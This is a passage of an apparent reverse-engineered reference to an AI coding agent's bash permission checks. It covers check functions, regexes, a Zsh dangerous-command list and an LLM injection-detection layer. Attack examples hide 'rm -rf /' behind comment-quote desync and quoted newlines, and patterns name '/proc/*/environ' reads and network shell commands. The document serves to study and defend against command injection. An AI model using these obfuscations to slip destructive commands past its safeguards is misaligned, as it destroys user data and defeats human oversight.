    return !A.startsWith("!") && !A.startsWith("=") &&
           !A.includes("$") && !A.includes("`") &&
           !A.includes("*") && !A.includes("?") &&
           !A.includes("[") && !A.includes("{") &&
           !A.includes("~") && !A.includes("(") &&
           !A.includes("<") && !A.startsWith("&");
}
```

Tokens containing `$`, backtick, or shell special chars are NOT simple paths — they're dangerous variable redirections.

---

## Compound Command Analysis

### hasOnlySimpleOperators (KYz)

**What it does:** Checks if a command uses only "safe" operators: pipes (`|`), sequencing (`&&`, `||`, `;`, `;;`), output redirects (`>`, `>>`), and stderr redirect (`>&`).

**Returns `false` if the command contains:** Comments (`#`), process substitution (`<(`), or any operator not in the safe set.

**Usage:** Called by `tOq` to determine if a compound command is inherently dangerous beyond injection checks.

### isCompoundDangerous (tOq)

```javascript
function tOq(A) {
    let { processedCommand } = XT6(A);
    if (!pz(processedCommand).success) return true;   // Unparseable = dangerous
    return AD(A).length > 1 && !KYz(A)               // Multiple subcommands + non-simple operators
}
```

### containsCdCommand (Pf6)

Detects if any subcommand is a `cd` command — used in `checkReadOnlyBehavior` to apply extra caution when `cd` + `git` appear in compound commands (could navigate to a directory where git operations have different security implications).

---

## Redirection Analysis

### extractRedirections (ik)

**What it does:** Analyzes all redirections in a command, classifying each as safe or dangerous.

**Algorithm:**
1. Tokenize command
2. Track process substitution contexts (`<(...)` and `>(...)`) — these are NOT simple redirections
3. Walk tokens looking for `>`, `>>`, `>&` operators
4. For each: call `checkDangerousRedirection` (f9z)
5. Return `{commandWithoutRedirections, redirections, hasDangerousRedirection}`

**Complete source restoration:** See the [Redirection Analysis Deep Dive](#redirection-analysis-deep-dive) section below for full code.

### checkDangerousRedirection (f9z)

**What it does:** Determines if a specific redirection is dangerous. Called with the operator token and its surrounding context.

**Return value:** `{skip: N, dangerous: boolean}` where `skip` = how many additional tokens to skip.

**Decision tree for `>` and `>>`:**

```
prev_token is digit?  (e.g., "2>" → file descriptor redirect)
  ├── next is "!" + safe_target → SAFE (fd redirect to named file)
  ├── next is "|" + safe_target → SAFE (pipe then redirect)
  ├── next is "!" + variable → DANGEROUS (fd redirect to variable)
  └── next is anything → SAFE/DANGEROUS based on target

prev_token is "|"?
  ├── next is safe_target → SAFE (skip 2: operator + target)
  └── next is variable → DANGEROUS

next is safe_target (Py)?   → SAFE (skip 1)
next is variable (DF)?      → DANGEROUS (skip 0)
```

**Decision tree for `>&`:**
```
Both prev and next are digits?  → SAFE (numeric fd redirect: 2>&1)
next is "|" + safe_target?      → SAFE
next is safe_target?            → SAFE (redirect to named file)
next is variable?               → DANGEROUS
```

**Key helper — isSafeRedirectionTarget (Py):**
```javascript
function isSafeRedirectionTarget(token) {
    return typeof token === "string" &&
           !token.startsWith("!") && !token.startsWith("~") &&
           !token.includes("$") && !token.includes("`") &&
           !token.includes("*") && !token.includes("?") &&
           !token.includes("[") && !token.includes("{")
}
```

**Key helper — containsVariable (DF):**
```javascript
function containsVariable(token) {
    return typeof token === "string" && (token.includes("$") || token.includes("%"))
}
```

---

## Security Check ID Reference

| ID | Constant Name | Check Function | Description |
|----|--------------|----------------|-------------|
| 1 | `INCOMPLETE_COMMANDS` | `mY4` | Tab/dash/operator prefix |
| 2 | `JQ_SYSTEM_FUNCTION` | `pY4` | `system()` in jq |
| 3 | `JQ_FILE_ARGUMENTS` | `pY4` | File-reading jq flags |
| 4 | `OBFUSCATED_FLAGS` | `rY4` | ANSI-C quoting, quoted flags |
| 5 | `SHELL_METACHARACTERS` | `QY4` | `;`, `\|`, `&` in quoted args |
| 6 | `DANGEROUS_VARIABLES` | `UY4` | Variables in redirections |
| 7 | `NEWLINES` | `w01` | Embedded newlines |
| 8 | `DANGEROUS_PATTERNS_COMMAND_SUBSTITUTION` | `dY4` | Backticks, `$()`, `<()` |
| 9 | `DANGEROUS_PATTERNS_INPUT_REDIRECTION` | `dY4` | `<` in unquoted content |
| 10 | `DANGEROUS_PATTERNS_OUTPUT_REDIRECTION` | `dY4` | `>` in unquoted content |
| 11 | `IFS_INJECTION` | `lY4` | `$IFS` manipulation |
| 12 | `GIT_COMMIT_SUBSTITUTION` | `FY4` | `$()` in git commit message |
| 13 | `PROC_ENVIRON_ACCESS` | `iY4` | `/proc/*/environ` |
| 14 | `MALFORMED_TOKEN_INJECTION` | `nY4` | Unbalanced brackets |
| 15 | `BACKSLASH_ESCAPED_WHITESPACE` | `oY4` | `\` before space/tab |
| 16 | `BRACE_EXPANSION` | `sY4` | `{a,b}` or `{1..3}` patterns |
| 17 | `CONTROL_CHARACTERS` | `Rp6`/`Yz4` | Non-printable control chars |
| 18 | `UNICODE_WHITESPACE` | `tY4` | Non-ASCII whitespace |
| 19 | `MID_WORD_HASH` | `eY4` | `#` in middle of word |
| 20 | `ZSH_DANGEROUS_COMMANDS` | `Kz4` | zmodload, emulate, sysopen |
| 21 | `BACKSLASH_ESCAPED_OPERATORS` | `aY4` | `\;`, `\|`, `\&`, `\<`, `\>` |
| 22 | `COMMENT_QUOTE_DESYNC` | `Az4` | Quote inside `#` comment |
| 23 | `QUOTED_NEWLINE` | `qz4` | Quoted newline + `#` pattern |

---

## Layer 1B: Additional Security Checks (IDs 15-23)

The following security checks were added to address additional attack vectors discovered after the initial 14 checks.

### checkBackslashEscapedWhitespace (oY4)

**What it does:** Detects backslash-escaped whitespace characters that could alter command parsing.

**How it works:**
1. Walks the command character by character, tracking quote state
2. When a backslash is found outside quotes, checks if next char is whitespace (space/tab)
3. If yes, the whitespace is being escaped which can change how shells parse the command

**Why this approach:**
- Escaped whitespace can merge arguments: `echo hello\ world` is one argument, not two
- This can bypass argument-based security checks that expect separate tokens

```javascript
// ============================================
// checkBackslashEscapedWhitespace - Detect escaped whitespace
// Location: chunks.91.mjs:1916
// ============================================

// ORIGINAL (for source lookup):
function oY4(A) {
    if (jg9(A.originalCommand)) return d("tengu_bash_security_check_triggered", {
        checkId: w3.BACKSLASH_ESCAPED_WHITESPACE
    }), {
        behavior: "ask",
        message: "Command contains backslash-escaped whitespace"
    };
    return { behavior: "passthrough", message: "No backslash-escaped whitespace" }
}

// READABLE (for understanding):
function checkBackslashEscapedWhitespace(context) {
    if (hasBackslashEscapedWhitespace(context.originalCommand)) {
        return { behavior: "ask", message: "Backslash-escaped whitespace detected" };
    }
    return { behavior: "passthrough" };
}

// Mapping: oY4→checkBackslashEscapedWhitespace, jg9→hasBackslashEscapedWhitespace
```

### checkBraceExpansion (sY4)

**What it does:** Detects bash brace expansion patterns that can generate multiple arguments from a single expression.

**How it works:**
1. Counts opening and closing braces in fully-unquoted content
2. If more closing than opening braces after quote stripping → obfuscation detected
3. Scans for `{a,b}` or `{1..3}` patterns inside brace contexts
4. Checks for quoted braces inside brace contexts (obfuscation attempt)

**Attack example:**
```bash
# Brace expansion generates multiple commands/arguments:
echo {a,b,c}  # Expands to: echo a b c
rm file{1..3}.txt  # Expands to: rm file1.txt file2.txt file3.txt
```

**Key insight:** Brace expansion happens BEFORE quote processing in bash, making it a potential bypass vector for argument-based checks.

### checkUnicodeWhitespace (tY4)

**What it does:** Detects Unicode whitespace characters that may be parsed differently by different tools.

**How it works:**
- Tests the original command against `UNICODE_WHITESPACE_REGEX` (`Dg9`)
- Matches: `\u00A0` (NBSP), `\u1680`, `\u2000-\u200A`, `\u2028`, `\u2029`, `\u202F`, `\u205F`, `\u3000`, `\uFEFF`

**Why this matters:**
- Unicode whitespace may be treated as regular whitespace by some parsers
- Can be used to bypass pattern matching that only checks ASCII space/tab
- Different shell implementations may handle Unicode whitespace differently

### checkMidWordHash (eY4)

**What it does:** Detects `#` characters that appear in the middle of a word (not at the start).

**How it works:**
1. Uses regex `/\S(?<!\$\{)#/` to find `#` preceded by non-whitespace (but not `${`)
2. Also checks line-continuation-normalized content
3. The lookbehind `(?<!\$\{)` excludes `${#var}` which is valid bash parameter expansion

**Why this is dangerous:**
- The `#` character starts a comment in bash
- If different parsers disagree on where the comment starts, the command could be misinterpreted
- `shell-quote` and `bash` may parse `foo#bar` differently

### checkZshDangerousCommands (Kz4)

**What it does:** Detects Zsh-specific commands that can bypass security checks.

**How it works:**
1. Skips environment variable assignments and Zsh prefixes (`command`, `builtin`, `noglob`, `nocorrect`)
2. Checks if the first real command is in `ZSH_DANGEROUS_COMMANDS` set (`Og9`)
3. Special check for `fc -e` which can execute arbitrary commands via editor

**Dangerous Zsh commands (`Og9`):**
- `zmodload` - Load Zsh modules (can add dangerous functionality)
- `emulate` - Change shell emulation mode
- `sysopen`, `sysread`, `syswrite`, `sysseek` - Direct system I/O
- `zpty` - Pseudo-terminal management
- `ztcp`, `zsocket` - Network operations
- `mapfile` - Array loading from files
- `zf_*` - Zsh FTP commands

**Key insight:** These commands provide capabilities beyond standard POSIX shell and can bypass security assumptions.

### checkBackslashEscapedOperators (aY4)

**What it does:** Detects backslash-escaped shell operators (`;`, `|`, `&`, `<`, `>`).

**How it works:**
1. If tree-sitter is available and reports no actual operator nodes, passes through
2. Otherwise, walks command checking for `\` followed by operator character
3. Skips single-quoted content (backslash is literal there)

**Why this is dangerous:**
- `\;` is treated as a literal semicolon argument, not a command separator
- But different parsers may disagree on whether it's escaped or not
- Can be used to hide command structure from security checks

### checkCommentQuoteDesync (Az4)

**What it does:** Detects quote characters inside `#` comments which can desynchronize quote tracking.

**How it works:**
1. If tree-sitter is available, passes through (tree-sitter's quote context is authoritative)
2. Walks command tracking single/double quote state
3. When `#` is found outside quotes, extracts the comment until newline
4. If comment contains quote characters → potential desync

**Attack example:**
```bash
echo hello # 'this is a comment with a quote
rm -rf /   # This line might be executed if quote tracking is desynced
```

**Why this matters:** Naive quote trackers may think they're inside a quote after seeing the `'` in the comment, causing them to miss the next line as executable code.

### checkQuotedNewline (qz4)

**What it does:** Detects newlines inside quotes followed by a `#`-prefixed line.

**How it works:**
1. Skips if command has no newlines or no `#` characters
2. Walks command tracking quote state
3. When a newline is found inside quotes, checks if next line starts with `#`
4. If yes → potential hiding of arguments from line-based permission checks

**Attack example:**
```bash
echo "hello
# -rf /" && rm -rf /
```
Line-based permission checks might see `echo "hello` and `# -rf /" && rm -rf /` as separate innocuous lines.

### checkExcessClosingBraces (cY4)

**What it does:** Detects unbalanced closing braces after quote stripping.

**How it works:**
- Simple check for patterns that indicate possible brace-related obfuscation
- Part of the brace expansion detection suite

---

## New Security Constants

### ZSH_DANGEROUS_COMMANDS (Og9)

```javascript
// ============================================
// ZSH_DANGEROUS_COMMANDS - Zsh-specific dangerous commands
// Location: chunks.91.mjs:2394
// ============================================

Og9 = new Set([
    "zmodload", "emulate", "sysopen", "sysread", "syswrite", "sysseek",
    "zpty", "ztcp", "zsocket", "mapfile",
    "zf_rm", "zf_mv", "zf_ln", "zf_chmod", "zf_chown",
    "zf_mkdir", "zf_rmdir", "zf_chgrp"
])
```

### SHELL_OPERATORS (Jg9)

```javascript
// ============================================
// SHELL_OPERATORS - Shell operator characters
// Location: chunks.91.mjs:2419
// ============================================

Jg9 = new Set([";", "|", "&", "<", ">"])
```

### UNICODE_WHITESPACE_REGEX (Dg9)

```javascript
// ============================================
// UNICODE_WHITESPACE_REGEX - Non-ASCII whitespace
// Location: chunks.91.mjs:2420
// ============================================

Dg9 = /[\u00A0\u1680\u2000-\u200A\u2028\u2029\u202F\u205F\u3000\uFEFF]/
```

### CONTROL_CHARACTERS_REGEX (Yz4)

```javascript
// ============================================
// CONTROL_CHARACTERS_REGEX - Non-printable control chars
// Location: chunks.91.mjs:2421
// ============================================

Yz4 = /[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/
```

---

## Updated DANGEROUS_PATTERNS (wg9)

The `DANGEROUS_PATTERNS` array has been expanded to include:

```javascript
// ============================================
// DANGEROUS_PATTERNS - Shell dangerous constructs
// Location: chunks.91.mjs:2361
// ============================================

wg9 = [
    { pattern: /<\(/, message: "process substitution <()" },
    { pattern: />\(/, message: "process substitution >()" },
    { pattern: /=\(/, message: "Zsh process substitution =()" },
    { pattern: /\$\(/, message: "$() command substitution" },
    { pattern: /\$\{/, message: "${} parameter substitution" },
    { pattern: /\$\[/, message: "$[] legacy arithmetic expansion" },
    { pattern: /~\[/, message: "Zsh-style parameter expansion" },
    { pattern: /\(e:/, message: "Zsh-style glob qualifiers" },
    { pattern: /\(\+/, message: "Zsh glob qualifier with command execution" },
    { pattern: /\}\s*always\s*\{/, message: "Zsh always block (try/always construct)" },
    { pattern: /<#/, message: "PowerShell comment syntax" }
]
```

**New patterns added:**
- `=(` - Zsh process substitution (writes to variable)
- `(\+` - Zsh glob qualifier that can execute commands
- `}\s*always\s*{` - Zsh `try/always` construct that can hide execution

| Decision | Rationale |
|----------|-----------|
| Allow-list before deny-list | Common safe patterns avoid expensive checks; false positive rate controlled |
| Sentinel-based tokenization | Preserves quote context that underlying tokenizer would strip |
| Heredoc placeholder extraction | Prevents heredoc content from triggering false positives in security checks |
| Random hex in all placeholders | Prevents collision with actual command content |
| LLM for prefix extraction | Shell syntax too complex for pure regex; LLM generalizes to new patterns |
| "command_injection_detected" LLM return | Defense-in-depth; LLM catches attacks that pass static checks |
| jq-mode quote stripping | jq uses `$var` in filters — double-quote preservation prevents false positives |
| Sed mini-parser | Sed has dozens of features; a comprehensive parser is necessary to avoid bypassable regex checks |
| Per-subcommand prefix extraction | Compound commands (`a && b`) need per-command prefix matching |
| `git` alone blocked as prefix | Too broad for permission matching; requires specific subcommand |
| Cached prefix extraction (qmA) | Expensive LLM call cached by command string for repeated checks |
| `git branch` additionalCallback | Most `git branch` flags are safe but branch creation/deletion is not — custom logic needed |
| Windows UNC path check | Platform-specific WebDAV attack vector; blocked even in read-only check |
| Bare git repo detection (EcY) | Git commands behave differently in bare repos; conservative block |
| jq exception in checkJqCommand (edY) | jq `system()` and file flags enable arbitrary code execution |
